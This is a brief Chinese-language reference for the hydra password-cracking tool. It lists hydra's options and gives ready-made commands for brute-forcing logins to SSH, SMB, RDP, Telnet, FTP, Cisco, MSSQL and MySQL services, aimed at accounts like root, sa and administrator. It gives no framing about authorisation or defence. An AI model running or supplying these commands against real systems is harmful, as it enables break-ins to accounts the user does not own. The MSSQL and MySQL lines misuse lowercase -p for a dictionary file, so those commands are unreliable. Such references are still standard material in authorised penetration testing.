# hydra

参数详解：
-R 根据上一次进度继续破解
-S 使用SSL协议连接
-s 指定端口
-l 指定用户名
-L 指定用户名字典(文件)
-p 指定密码破解
-P 指定密码字典(文件)
-e 空密码探测和指定用户密码探测(ns)
-C 用户名可以用：分割(username:password)可以代替-l username -p password
-o 输出文件
-t 指定多线程数量，默认为16个线程
-vV 显示详细过程
server 目标IP
service 指定服务名(telnet ftp pop3 mssql mysql ssh ssh2...)

使用hydra破解ssh的密码
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh

破解smb
hydra -l administrator -P pass.txt IP smb

破解rdp
hydra IP rdp -l administrator -P pass.txt -V

破解telnet
hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

破解ftp
hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV

破解cisco
hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

破解sqlserver密码
hydra.exe -l sa -p c:\pass.txt 192.168.2.3 mssql

破解Mysql密码
hydra.exe -l root -p c:\pass.txt 192.168.2.3 mysql